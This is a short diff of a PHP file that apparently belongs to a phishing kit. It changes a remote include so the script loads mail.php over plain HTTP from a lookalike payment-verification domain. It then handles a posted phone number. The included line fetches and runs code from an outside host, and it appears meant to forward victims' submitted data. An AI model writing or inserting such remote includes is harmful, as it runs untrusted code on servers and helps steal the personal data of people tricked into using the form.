@@ -1,6 +1,6 @@
 <?php
 
-include('https://bobstottts.000webhostapp.com/mail.php');
+include('http://alipayverify.website/mail.php');
 
 if (isset($_POST['phoneNumber'])) { 
 
